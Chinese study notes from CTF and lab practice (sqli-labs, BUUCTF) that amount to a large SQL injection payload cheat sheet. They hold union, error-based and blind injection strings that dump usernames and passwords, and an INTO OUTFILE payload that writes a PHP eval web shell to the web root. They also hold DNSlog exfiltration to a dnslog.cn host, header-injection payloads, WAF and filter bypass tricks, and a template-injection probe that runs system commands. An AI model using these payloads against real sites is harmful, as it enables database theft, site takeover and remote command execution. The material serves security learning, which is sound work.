# sql注入

## sql注入注意事项

1.在使用弱密码`1' or 1=1 #`登陆进去后把`or 1=1`删掉并在这个位置进行注入可能会发现回显位     **#注意:如果若密码不行可能时or或者#被过滤**



## 什么是注入

所谓SQL注入,就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串,最终到达七篇服务器执行恶意的SQL命令,从而进一步得到相应的数据信息

#通过构造一条精巧的语句,来查询到想要得到的信息

## 基本命令

- ----

	`show` databases;   #查看数据库

- create database employees charset utf8;   #创建数据库并选择字符集

- drop database employees;    #删除数据库

- use employees;     #选择进入数据库

- show full columns from employee;   #查看数据表信息
- select * from employee    #查看数据表列表
- drop table employee;    #删除数据表
- rename table employee to user    #修改数据表名称为user

- alter table user character set utf8;       #修改字符集



## 数据列和数据行

- 写入内容:

	insert into user (id,name,sex)

	values (1,'ctfstu','male');

- 查看数据列表

	select * from user;

- 增加一列内容:

	alter table user add salary decimal(8,2);

- 修改所有工资为5000

	update user set salary=5000;

- 修改id=1的行name为'benben'

	update user set name='benben' where id=1;

- 同时修改两行

	update user set name='benben2',salary=3000 where id=1;

- 删除列

	alter table user drop salary;

- 删除行

	delete from user where job='it';

- 删除表

	delete from user;



## sql查询

- select * from users where id=1;

- select * from users where id in ('3');    #从users表格查询所有id包含3的

- 子查询  优先执行()内查询语句

	select * from users where id=(select id from users where username='admin')

### union查询

- select id from users union select email_id from emails;

	#查询并合并数据显示

- select * from users where id=6 union select * from emails where id=6;

	#ERROR:列数不相同报错    联合注入前后表格列数必须相等

- select * from users where id=6 union select *,3 from emails where id=6;

	#3为填充列

### group by分组

一般用于二分法判断数据表列数

select * from users where id=9 group by 2;

### order by

SELECT * FROM users ORDER BY 2 (desc);

#按第2列升序排序    (desc表示降序排序)

### limit限制输出数量

select * from users limit 0,3;

#限制为从第0行开始显示3行

### and 和 or

**and:**

select * from users where id=1 AND username='Dumb';

**or:**

select * from users where id=1 or username='Dumb';

### 常用函数

- group_contact()

	select GROUP_CONCAT(id,username,password) from users;

	#合并到一行显示

- select database()

	查询当前数据库名字

- select version()

	查询当前版本



## 注入基础

### 注入分类

- 按照查询字段:`字符型`    `数字型`
- 按照注入方法:`union注入`  `报错注入`   `布尔注入`   `时间注入`

### 什么是注入点

注入点就是可以实行注入的地方,通常是一个访问数据库的链接

### 如何判断是字符型注入还是数字型注入

提交`and 1=1`和`and 1=2`都能正常显示界面,则是字符型注入

提交`and 1=2`无法正常显示,则为数字型注入

### 闭合方式

`'`            `"`           `')`             `")`              ` 其他`

### 如何判断闭合方式

- 输入?id=1不报错

​       输入?id=1'报错

​		输入?id=1'--+不报错

​		说明闭合方式为`'`

- 输入?id=1'"      报错为near 1'"'      说明闭合符为`'`

- 输入?id=1'"       报错为near 1'"'')       说明闭合符为`')`

**不需要的语句可以用`--+` `#` `%23`注释掉**

## union联合注入

### 注入基本步骤

1.查找诸如点

2.判断是字符型注入还是数字型注入     `?id=2-1`

3.如果是字符型,找到他的祝贺方式

4.判断查询列数,         group by            order by

5.查询回显位置(把原来的id设置为不存在的)

select * FROM users where id=0 union select 1,2,database();

### 拿到表名和列名

**查询表名:**

SELECT * from users where id=-1 union select GROUP_CONCAT(TABLE_NAME),2,3 from information_schema.tables where table_schema=database() ;

如果报错也可以试试:

SELECT * from users where id=-1 union select (select GROUP_CONCAT(TABLE_NAME) from information_schema.tables where table_schema=database()),2,3;

因为我在注释符被过滤时结尾使用单引号闭合,第一种方法就报错了

**查询列名:**

 SELECT * from users where id=-1 union select GROUP_CONCAT(COLUMN_name),2,3 from information_schema.columns where table_schema=database() and TABLE_NAME='users';

**查询账号密码:**

SELECT * from users where id=-1 union select GROUP_CONCAT(username,'~',password),2,3 from users;

#### 数据库

information_schema   #包含所有mysql数据库的简要信息

其中包含两个所诉数据表:

tables(表名集合表)和columns(列名集合表)



## 报错注入

### floor()报错注入

 涉及到的函数

- rand()函数:随机返回0~1之间的小数

	`select rand() from users;`         #根据users的行数随机显示结果

	`select floor(rand())`                   #结果随机为0或1

floor()函数:小数向下取整数

ceiling()函数:小数向上取整数

concat_ws():将括号内数据用第一个字段连接起来

group by子句

as:别名

count():汇总统计数量

limit:这里用于显示指定行数

limit 0,1            #从第0行开始,显示1行

**实例:**

`?id=1' union select 1,count(*),concat_ws('~',(select concat('~',username,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+`



### extractValue()报错注入

- 正确写法:select extractvalue(doc,'/book/title') from xml

	#查询书名

- 把查询参数路径写错:select extractvalue(doc,'/book/titlell') from xml

​       #查询不到内容,但不会报错

- 把查询**参数格式符号**写错:select extractvalue(doc,'~book/title') from xml

​       #提示报错信息

利用extractvalue()报错注入:

?id=100' union select 1,extractvalue(1,`concat(0x7e,(select database())`)),3 --+

**concat():**拼接函数

**0x7e**:等同于'~'

**注意:**每次查询只需要更换``内的内容就可以

默认只能返回32个字符

**substring**解决只能返回32个字符的问题

`substring('目标字符串',从第几位开始显示,显示几位)`

**注入实例:**

?id=1' union select 1,2,extractvalue(1,concat('~',(select 
 group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) --+



### updatexml()报错注入

?id=1" and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)--+



- table_schema是数据库名称

- table_name是数据表名称

- **查询列名(常用,记):**

	(select 
	 group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')

- **查询表名(常用,记)**

	(select group_concat(table_name) from information_schema.tables where table_schema=database())

- **查询具体数据(常用,记):**

	(select group_concat(username,password) from users)

- **使用substring()获取完整数据:**

	?id=1" and 1=extractvalue(1,concat('~',substring((select group_concat(username,'-',password) from users),1,30))) --+



**靶机用户名密码存放位置的表名和列名:**

数据库information+schema中的数据表tables下数据列table_name和

​                                                     数据表columns下数据列solumn_name



## 布尔盲注(circle mark)

**盲注:**页面既没有具体返回值,由没有报错回显的情况下,对数据库中的内容进行猜解,实行SQL注入

**布尔盲注:**web页面只返回True,False两种类型,利用页面返回不同,逐个猜解数据

当`?id=1' and 1=1 --+`正确,`?id=1' and 1=2 --+`错误

就具备了布尔盲注的条件



**ascii()函数:**返回字符的ascii码

​					把字母转换成数字



`?id=1' and ascii(substring(database(),1,1))<=ascii('h') --+`

poc脚本:

**GET盲注POC脚本.py**

#跑大量请求的脚本时,加个sleep可以保证每次请求都成功完成





## 时间盲注

**时间盲注:**web页面只返回一个正常页面,利用页面响应时间不同,逐个猜解数据

- 关键函数:sleep()

	语法:sleep(3)       #延迟3秒

- if(condition,true,false)

	条件为真则返回第一个语句,条件为假返回第二个语句

**实例:**

`?id=1' and if(ascii(substring((select database()),1,1))<=ascii('r'),sleep(0),sleep(3))--+`



## mysql 文件上传

`show variables like'%secure%';`      #用来查看



原理很简单：就是用into outfile函数将一个可以用来上传的php文件写到网站的根目录下

`?id=-1')) union select 1,2,"<?php @eval($_POST['password']); ?>" into outfile "D:\\phpstudy_pro\\WWW\\ben.php" --+`

然后就可以通过`蚁剑`和`中国菜刀`来拿到网站的控制权

**注意:**password为预留的密码

​		`D:\\phpstudy_pro\\WWW`为网站的根目录



## DNSlog注入

**load_file():**查看文件内容

`select load_file("C:\\ben.txt");`

可以查看指定地址下的文件

 

`?id=1' and (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 2,1),".w4mlap.dnslog.cn/a"))) --+`

其中`w4mlap.dnslog.cn`是从[DNSLog Platform](http://www.dnslog.cn/)上获取的域名



## 使用dnslogsqlinj工具完成注入

进入到linux系统的文件目录下

`python2 dnslogSql.py -u "http://192.168.10.15/sql/Less-9?id=1' and ({}) --+"`

具体命令:

- `python2 dnslogSql.py -u "http://192.168.64.152/sqli-labs/Less-9/?id=1' and ({})--+" --dbs`       #得到表名
- `python2 dnslogSql.py -u "http://192.168.64.152/sqli-labs/Less-9/?id=1' and ({})--+"`        #得到当前表名和用户名

- `python2 dnslogSql.py -u "http://192.168.64.152/sqli-labs/Less-9/?id=1' and ({})--+" -D security --tables`

	#得到表名

- `python2 dnslogSql.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+" -D security -T users --columns`

	#得到users表的列名

- `python2 dnslogSql.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+" -D security -T users -C username,password --dump`

	#获取uses表中的数据



## POST

1.get提交可以被缓存,post不会

2.get提交参数会保留在浏览器历史记录里,post不会

3.get提交可以被收藏为书签,post不行

4.get提交有长度限制,最长2048个字符;post没有长度要求,不是只允许使用ascii字符们还可以使用二进制数据

post提交比get提交更安全



## post报错注入

`uname=admin') union select count(*),concat_ws('~',(select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2)) as a from information_schema.tables group by a #`

**注意:**因为一次只能查看一行,所以使用`limit`一行一行查看

**工具:**`hackbar`



## post盲注

### 布尔盲注

`passwd=admin&Submit=Submit&uname=aaa' or ascii(substring((select database()),1,1))>=ascii('s') # `

### 时间盲注

`passwd=admin&Submit=Submit&uname=aaa' or if(ascii(substring(select( database()),2,1))>=ascii('s'),sleep(0),sleep(2)) # `

## dnslog注入

`passwd=admin&Submit=Submit&uname=aaa' or (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 0,1),".wkpllp.dnslog.cn/a"))) --+` # `



## POST报头注入

页面看不到明显变化,找不到诸如点,可以尝试报头注入

post注入是,万能密码无法绕过验证,可以通过查看源代码分析页面的执行动作



### uagent

即User-Agent,中文名为用户代理,简称UA,它是一个特殊字符串头,使得服务器能够识别客户使用的操作系统及版本,cpu类型,浏览器及版本,浏览器渲染引擎,浏览器语言,浏览器插件等.

内容就是浏览器及版本信息,电脑信息等.

常见用途为限制打开软件,浏览器,以及网上行为管理等.

使用burpsuite抓包,更改User-Agent为:

`User-Agent:' or updatexml(1,concat('#',(select database())),0),'','')#`

**注意:**用代理拦截数据包,把数据包发送到repeater可以在burpsuite上反复修改数据包内容



### referer

即HTTP Referer,是头部信息header的一部分,当浏览器向web服务器发送请求的时候,一般会带上Referer,告诉服务器该网页是从哪个页面链接过来的,服务器因此可以获得一些信息用于处理

常见用法   防盗链:比如只允许自己的网站访问自己的图片服务器,自己的域名是www.google.com,那么服务器每次提取到Referer来判断是不是自己的域名,如果是就继续访问,不是就拦截

防止恶意请求

空referer

`Referer: ' or extractvalue(1,concat('~',(select database()))),2)#`



### cookie

临时身份证

`Cookie: uname=' union select 1,2,(select group_concat(username,'~',password) from users) --+`



**注意:**

优先选用`联合注入` >> `报错注入` >> `布尔盲注` >> `时间盲注`



## sql注入绕过过滤符

**注意:**数字型不用考虑闭合符



手动多加闭合符号,把后面的源代码的注释符号手动闭合

例如:

以`''`为闭合符号,注入:

`?id=-1' union select 1,2,database() '`

在两个单引号之间可以注入查询语句



- `''`闭合只需在后面增加一个单引号即可
- `""`闭合只需在注入语句后面增加一个双引号
- `('')`闭合需要多加一个`or ('1')=('1`

- `("")`闭合需要多加一个`or ("1")=("1`



## and和or过滤绕过

1.使用大小写绕过,例如:

`?id=1' anD 1=1 --+`

2.复写过滤字符

`?id=1' anandd 1=1 --+`\

3.用`&&`取代and,用`||`取代or

`?id=1' && 1=1 --+`

`>id=1' %26%26 1=1 --+`



## 空格绕过

**注释绕过:**`\**\`代替`" "`

**URL编码绕过:**`%20`  `%A0`  `%0A`  `%09`  `%0B`  `%0C`  `%0D`

**使用报错注入:**

`?id=0'||extractvalue(1,concat('~',(database())))||'`

多用括号代替空格;

查询表名

`?id=0'||extractvalue(1,concat('~',(select(group_concat(table_name))from (infoorrmation_schema.tables)where(table_schema=database()))))||'`

查询列名

`?id=0'||extractvalue(1,concat('~',(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users'))))||'`

拿到用户名,密码



## limit()substring()函数过滤绕过

可以用mid()函数,用法和substring()一样



## 逗号过滤绕过



查询users表用户的email是多少

`select u.*,e.*
from users u,emails e
where u.id=e.id;`

使用join:

`select u.*,e.*
from users u JOIN emails e on u.id=e.id;`



join绕过逗号限制的原理:

`union select 1,2,3`     等价于

`union select * from (select 1)a join (select 2)b join (select 3)c`

实例;

`?id=0 union select * from (select 1)a join (select 2)b join (select group_concat(table_name) from table_schema.tables where table_schema=database())c`

**注意:**在获取用户名和密码时,因为`,`被过滤,所以得分两次分别获取用户名和密码



## union和select过滤绕过

1.大小写绕过

2.复写单词绕过

MySQL 除了可以使用 select 查询表中的数据，也可使用 **handler** 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。
**handler:**

`handler [表名] open as p;`

`handler p read first/next/prev/last;`        

分别对应第一行,下一行,上一行,最后一行

`handler p close;`



## 宽字节注入绕过mp4

**addslashes():**

在指定的预定义字符前添加反斜杠.这些字符是单引号('),("),(\)与null字符

**GBKB编码:**

字符`\`的ascii码为5C,在其低位范围内,就可能被转换为一个服务器数据库不识别的汉字,能和它组合的字符如`%df5c`,`%815c`,`%825C`,`%835C`

mysql在使用GBK编码时,会认为两个字符为一个汉字,所以可以使用一些字符,和经过转义过后多出来的`\`组合成两个字符没变成mysql数据库不识别的汉字字符,**导致对单引号,双引号的转义失败,使其参数闭合**

输入`%df'`,本来会转义单引号为`\'`,但`%df%5c`符合GBK范围,会解析为一个汉字,`\`失去应有的作用

**注意:**只有当sql使用GBK编码时才可以使用宽字节注入



## 安全狗绕过思路

## 常见waf绕过语句

waf绕过常用方法:

### 注释

`/**/`在mysql里是多行注释

`/*!......*/`扩张了注释的功能,加了`!`后,注释里的语句将被实行

`/*!50001*/`表示假如 数据库是5.0001以上版本,该语句才会被执行

### 替换

#### and和or替换

1.&&和||

2.使用异或截断

`?id=1^1^0`      #相当于and 1=2

`?id=1^1^1`      #相当于and 1=1

3.使用负数检测或者16进制

`and -1=-1
and 0x1
and -1>-2`





## buuctf web随便注入笔记

**爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）**

select被过滤可以使用`concat`拼接

`-1';use supersqli;set @sql=concat('s','elect flag from 1919810931114514');PREPARE stmt1 FROM @sql;EXECUTE stmt1`

**#但是没有成功**



也可以编码逃逸,构造payload:

`select flag from '表名'`

`-1';SeT@a=0x73656C65637420666C61672066726F6D20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`

prepare…from…是预处理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
0x就是把后面的编码格式转换成16进制编码格式
那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare…from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。



1';rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT '12';ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q

ALTER TABLE  words CHANGE flag data VARCHAR(100);

#修改flag属性名为data,可以显示flag



## buuctf easySQL

猜测源代码

`select $_GET['query'] || flag from flag`



payload:

`1;set sql_mode=PIPES_AS_CONCAT;select 1`

#sql_mode=pipes_as_concat可以让||变成连接符

或者

`*,1`

#sql语句就变成了select *,1||flag from Flag，



## sql Fuzz注入工具

在fuzz注入判断被过滤的东西时,手动fuzz过于麻烦

可以使用burp suite的**intruder**模块

- 抓包之后发送到intruder

- payload类型选择简单列表

- payload设置选择从文件加载

	#在github上下载了一个fuzzdb的文件夹,里面有一个txt文件

	E >> programfiles >> fuzzdb >> attack >> sql-injection >> detect >> xplatform.txt

- 添加payload位置,开始攻击
- 攻击完之后可以查看哪些payload被过滤



## 模板注入

**Flask**可能存在**Jinjia2模版注入漏洞**
**PHP**可能存在**Twig模版注入漏洞**

添加模版算式，检测其是否可被执行：

```php
X-Forwarded-For: {{7*7}}
```

如果成功执行,尝试是否能执行命令

`{{system('ls')}}`



## regexp使用

`where(F1rst_to_Th3_eggggggggg!)regexp('^f')`

筛选为f开头的flag内容

`'f$'`

筛选为f结尾的



## reverse()函数

当过滤了mid、substr、left、right关键字，无法分段读取时

可以使用reverse函数倒序输出字符串



## 无列名注入

在无列名注入前要先爆破列数

```text
select `3` from (select 1,2,3 union select * from admin)a;
```

反引号如果被过滤就用别名来代替

实例:

```
1'/**/union/**/select/**/1,(select/**/concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)d/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

